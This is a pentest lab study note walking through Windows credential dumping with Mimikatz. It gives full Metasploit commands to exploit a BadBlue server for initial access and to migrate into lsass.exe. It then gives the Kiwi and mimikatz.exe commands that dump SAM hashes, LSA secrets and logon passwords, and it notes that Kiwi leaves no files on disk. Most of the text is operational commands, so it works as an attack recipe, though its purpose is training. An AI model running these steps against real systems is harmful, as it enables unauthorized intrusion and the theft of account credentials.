## Dumping Hashes with Mimikatz

**What is it?**

- De facto standard tool for post-exploitation on Windows
- Extracts clear-text passwords, NTLM hashes, and Kerberos tickets from memory
- Written by Benjamin Delpy
- Requires **elevated/SYSTEM privileges** to run

**How it works**

- `lsass.exe` (Local Security Authority Subsystem) handles user auth and caches hashes from SAM database in RAM
- Mimikatz reads directly from LSASS process memory
- Windows 8.1+ no longer stores clear-text passwords — but NTLM hashes still available

**Two ways to use it**

|Method|How|
|---|---|
|Kiwi (Meterpreter extension)|In-memory, no file uploaded, no artifacts left|
|Mimikatz executable|Upload `.exe` to target, run directly|

## Commands

**Step 1 — Get initial access (BadBlue exploit in this lab)**

```bash
nmap -sV <TARGET_IP>
msfconsole
search badblue
use 1
set RHOSTS <TARGET_IP>
exploit
```

**Step 2 — Migrate to lsass.exe process**

```bash
sysinfo
getuid
pgrep lsass
migrate <PID>
getuid              # Should show NT AUTHORITY\SYSTEM
```

---

### Method 1 — Kiwi (Meterpreter Extension)

**Load Kiwi**

```bash
load kiwi
```

**Dump all credentials**

```bash
creds_all
```

**Dump SAM database hashes**

```bash
lsa_dump_sam
```

**Dump LSA secrets**

```bash
lsa_dump_secrets
```

---

### Method 2 — Mimikatz Executable

**Upload Mimikatz to target**

```bash
# In meterpreter:
mkdir C:\\temp
cd C:\\temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell
```

**Run Mimikatz**

```cmd
mimikatz.exe
```

**Check privileges (do this first)**

```
privilege::debug
# Should return: Privilege '20' OK
```

**Dump SAM hashes**

```
lsadump::sam
```

**Dump LSA secrets**

```
lsadump::secrets
```

**Dump logon passwords (clear-text if available)**

```
sekurlsa::logonpasswords
```

---

**⚠️ Key Points**

- Must migrate to `lsass.exe` before dumping — needs SYSTEM privileges
- Kiwi is stealthier — runs in memory, leaves no files on disk
- Clear-text passwords null on Windows 8.1+ — but NTLM hashes still useful
- NTLM hashes can be used for **Pass the Hash** attack (next topic)
- Never change passwords during a real pentest — breaks production accounts
